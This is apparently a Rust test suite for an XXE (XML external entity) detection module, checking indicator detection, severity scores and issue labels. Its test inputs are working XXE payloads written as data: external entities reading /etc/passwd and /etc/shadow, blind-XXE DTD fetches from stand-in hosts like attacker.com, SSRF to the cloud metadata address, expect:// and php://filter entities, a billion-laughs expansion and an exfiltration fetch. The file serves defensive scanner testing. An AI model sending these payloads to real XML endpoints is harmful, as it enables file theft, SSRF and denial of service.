use crate::xxe_scanner::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_xxe_indicators("");
    assert!(issues.is_empty());
}

#[test]
fn detects_dtd_declaration_system() {
    let body =
        r#"<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo>bar</foo>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::DtdDeclaration));
}

#[test]
fn detects_dtd_declaration_public() {
    let body = r#"<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1.dtd">"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::DtdDeclaration));
}

#[test]
fn no_dtd_without_system_or_public() {
    let body = r#"<!DOCTYPE html><html></html>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(!issues.contains(&XxeIssue::DtdDeclaration));
}

#[test]
fn detects_external_entity_ref() {
    let body = r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::ExternalEntityRef));
}

#[test]
fn detects_external_entity_ref_public() {
    let body = r#"<!ENTITY xxe PUBLIC "-//OASIS//DTD" "http://evil.com/payload">"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::ExternalEntityRef));
}

#[test]
fn detects_parameter_entity() {
    let body = r#"<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::ParameterEntity));
}

#[test]
fn no_parameter_entity_without_semicolon() {
    let body = "this is 50% done already";
    let issues = analyze_xxe_indicators(body);
    assert!(!issues.contains(&XxeIssue::ParameterEntity));
}

#[test]
fn detects_xml_processing_instruction() {
    let body = r#"<?xml-stylesheet type="text/xsl" href="style.xsl"?>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XmlProcessingInstruction));
}

#[test]
fn detects_custom_processing_instruction() {
    let body = r#"<?custom-pi data="value"?>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XmlProcessingInstruction));
}

#[test]
fn xml_declaration_not_flagged_as_pi() {
    let body = r#"<?xml version="1.0" encoding="UTF-8"?><root/>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(!issues.contains(&XxeIssue::XmlProcessingInstruction));
}

#[test]
fn detects_soap_envelope() {
    let body = r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser/></soap:Body></soap:Envelope>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::SoapEndpoint));
}

#[test]
fn detects_wsdl_reference() {
    let body = r#"<definitions xmlns="http://schemas.xmlsoap.org/wsdl/"><service name="TestService"/></definitions>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::SoapEndpoint));
}

#[test]
fn detects_xslt_processing() {
    let body = r#"<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"/></xsl:stylesheet>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XsltProcessing));
}

#[test]
fn detects_xslt_keyword() {
    let body = "The server uses XSLT transformations for rendering output.";
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XsltProcessing));
}

#[test]
fn detects_xml_content_type_application() {
    let body = r#"Content-Type: application/xml"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XmlContentType));
}

#[test]
fn detects_xml_content_type_text() {
    let body = r#"Content-Type: text/xml; charset=utf-8"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::XmlContentType));
}

#[test]
fn detects_svg_upload_accept() {
    let body = r#"<input type="file" accept="image/svg+xml" name="avatar">"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::SvgUpload));
}

#[test]
fn detects_svg_upload_file_reference() {
    let body =
        r#"<form action="/upload"><input type="file" name="logo">.svg files accepted</form>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::SvgUpload));
}

#[test]
fn severity_external_entity_ref() {
    assert_eq!(xxe_severity(&XxeIssue::ExternalEntityRef), 9.0);
}

#[test]
fn severity_dtd_declaration() {
    assert_eq!(xxe_severity(&XxeIssue::DtdDeclaration), 8.0);
}

#[test]
fn severity_parameter_entity() {
    assert_eq!(xxe_severity(&XxeIssue::ParameterEntity), 8.5);
}

#[test]
fn severity_xml_processing_instruction() {
    assert_eq!(xxe_severity(&XxeIssue::XmlProcessingInstruction), 5.5);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![XxeIssue::DtdDeclaration, XxeIssue::ExternalEntityRef];
    let mut seq = 0;
    let ops = xxe_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn to_operations_empty_vec() {
    let issues: Vec<XxeIssue> = vec![];
    let mut seq = 0;
    let ops = xxe_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn display_variants() {
    assert_eq!(XxeIssue::DtdDeclaration.to_string(), "dtd_declaration");
    assert_eq!(
        XxeIssue::ExternalEntityRef.to_string(),
        "external_entity_ref"
    );
    assert_eq!(XxeIssue::ParameterEntity.to_string(), "parameter_entity");
    assert_eq!(
        XxeIssue::XmlProcessingInstruction.to_string(),
        "xml_processing_instruction"
    );
    assert_eq!(XxeIssue::SoapEndpoint.to_string(), "soap_endpoint");
    assert_eq!(XxeIssue::XsltProcessing.to_string(), "xslt_processing");
    assert_eq!(XxeIssue::XmlContentType.to_string(), "xml_content_type");
    assert_eq!(XxeIssue::SvgUpload.to_string(), "svg_upload");
}

#[test]
fn security_empty_body() {
    let issues = analyze_xxe_security("");
    assert!(issues.is_empty());
}

#[test]
fn security_no_xml_context() {
    let body = "<html><head><title>Test</title></head><body>Hello</body></html>";
    let issues = analyze_xxe_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_detects_xxe_exfiltration() {
    let body = r#"
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <script>fetch('/exfil?data=' + document.body.innerText);</script>
    "#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeExfiltration));
}

#[test]
fn security_detects_xxe_ssrf_localhost() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
        ]>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeSsrf));
}

#[test]
fn security_detects_xxe_ssrf_metadata() {
    let body = r#"<?xml version="1.0"?>
        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeSsrf));
}

#[test]
fn security_detects_xxe_ssrf_loopback() {
    let body = r#"<?xml version="1.0"?>
        <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cat/indices">"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeSsrf));
}

#[test]
fn security_detects_xxe_rce_expect() {
    let body = r#"<!ENTITY xxe SYSTEM "expect://id">"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeRce));
}

#[test]
fn security_detects_xxe_rce_php() {
    let body = r#"<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeRce));
}

#[test]
fn security_detects_xxe_file_read() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/shadow">
        ]><foo>&xxe;</foo>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeFileRead));
}

#[test]
fn security_detects_xxe_dos() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol1 "&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;">
        ]><root>&lol2;</root>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeDos));
}

#[test]
fn security_detects_xxe_dos_billion_laughs() {
    let body = r#"<!ENTITY lol "lol">&lol;"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeDos));
}

#[test]
fn security_detects_xxe_blind() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
        ]>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeBlind));
}

#[test]
fn security_detects_unsafe_xml_parser() {
    let body = "parser.disable_external_entities=false; parser.parse(xml_input);";
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::UnsafeXmlParser));
}

#[test]
fn security_detects_unsafe_xml_parser_feature() {
    let body =
        "factory.setFeature(FEATURE_EXTERNAL_ENTITIES, true); xml_doc = factory.parse(data);";
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::UnsafeXmlParser));
}

#[test]
fn security_detects_xml_input_unvalidated() {
    let body = "const doc = xml.parse(req.body); const user = doc.input;";
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XmlInputUnvalidated));
}

#[test]
fn security_no_unvalidated_when_schema_present() {
    let body = "const doc = xml.parse(req.body); validate(doc, schema);";
    let issues = analyze_xxe_security(body);
    assert!(!issues.contains(&XxeSecurityIssue::XmlInputUnvalidated));
}

#[test]
fn security_detects_xxe_in_json_api() {
    let body = r#"
        // API endpoint accepts application/json
        // but also responds to application/xml content type
        Content-Type: application/json
        Accept: application/xml
    "#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeInJsonApi));
}

#[test]
fn security_detects_soap_injection() {
    let body = r#"<soap:Envelope><soap:Body><GetUser><userId>{user_input}</userId></GetUser></soap:Body></soap:Envelope>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::SoapInjection));
}

#[test]
fn security_severity_xxe_rce() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeRce), 9.5);
}

#[test]
fn security_severity_xxe_file_read() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeFileRead), 9.0);
}

#[test]
fn security_severity_xxe_exfiltration() {
    assert_eq!(
        xxe_security_severity(&XxeSecurityIssue::XxeExfiltration),
        8.5
    );
}

#[test]
fn security_severity_xxe_ssrf() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeSsrf), 8.5);
}

#[test]
fn security_severity_xxe_blind() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeBlind), 8.0);
}

#[test]
fn security_severity_xxe_dos() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeDos), 7.5);
}

#[test]
fn security_severity_unsafe_xml_parser() {
    assert_eq!(
        xxe_security_severity(&XxeSecurityIssue::UnsafeXmlParser),
        7.0
    );
}

#[test]
fn security_severity_soap_injection() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::SoapInjection), 7.0);
}

#[test]
fn security_severity_xxe_in_json_api() {
    assert_eq!(xxe_security_severity(&XxeSecurityIssue::XxeInJsonApi), 6.5);
}

#[test]
fn security_severity_xml_input_unvalidated() {
    assert_eq!(
        xxe_security_severity(&XxeSecurityIssue::XmlInputUnvalidated),
        6.0
    );
}

#[test]
fn security_operations_creates_entries() {
    let issues = vec![XxeSecurityIssue::XxeExfiltration, XxeSecurityIssue::XxeRce];
    let mut seq = 0;
    let ops = xxe_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_operations_empty_vec() {
    let issues: Vec<XxeSecurityIssue> = vec![];
    let mut seq = 0;
    let ops = xxe_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn security_display_variants() {
    assert_eq!(
        XxeSecurityIssue::XxeExfiltration.to_string(),
        "xxe_exfiltration"
    );
    assert_eq!(XxeSecurityIssue::XxeSsrf.to_string(), "xxe_ssrf");
    assert_eq!(XxeSecurityIssue::XxeRce.to_string(), "xxe_rce");
    assert_eq!(XxeSecurityIssue::XxeFileRead.to_string(), "xxe_file_read");
    assert_eq!(XxeSecurityIssue::XxeDos.to_string(), "xxe_dos");
    assert_eq!(XxeSecurityIssue::XxeBlind.to_string(), "xxe_blind");
    assert_eq!(
        XxeSecurityIssue::UnsafeXmlParser.to_string(),
        "unsafe_xml_parser"
    );
    assert_eq!(
        XxeSecurityIssue::XmlInputUnvalidated.to_string(),
        "xml_input_unvalidated"
    );
    assert_eq!(
        XxeSecurityIssue::XxeInJsonApi.to_string(),
        "xxe_in_json_api"
    );
    assert_eq!(
        XxeSecurityIssue::SoapInjection.to_string(),
        "soap_injection"
    );
}

#[test]
fn security_combined_multiple_issues() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        <!ENTITY blind SYSTEM "http://attacker.com/evil.dtd">
        ]>
        <root>
        &xxe;
        <script>fetch('/exfil');</script>
        </root>"#;
    let issues = analyze_xxe_security(body);
    assert!(issues.contains(&XxeSecurityIssue::XxeExfiltration));
    assert!(issues.contains(&XxeSecurityIssue::XxeFileRead));
    assert!(issues.contains(&XxeSecurityIssue::XxeBlind));
}

#[test]
fn case_insensitive_detection() {
    let body = r#"<!DOCTYPE FOO SYSTEM "http://evil.com/xxe.dtd">"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::DtdDeclaration));
}

#[test]
fn multiple_indicator_issues() {
    let body = r#"<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        <?xml-stylesheet type="text/xsl" href="style.xsl"?>
        <soap:Envelope><soap:Body>
        Content-Type: application/xml
        </soap:Body></soap:Envelope>"#;
    let issues = analyze_xxe_indicators(body);
    assert!(issues.contains(&XxeIssue::DtdDeclaration));
    assert!(issues.contains(&XxeIssue::ExternalEntityRef));
    assert!(issues.contains(&XxeIssue::XmlProcessingInstruction));
    assert!(issues.contains(&XxeIssue::SoapEndpoint));
    assert!(issues.contains(&XxeIssue::XmlContentType));
}
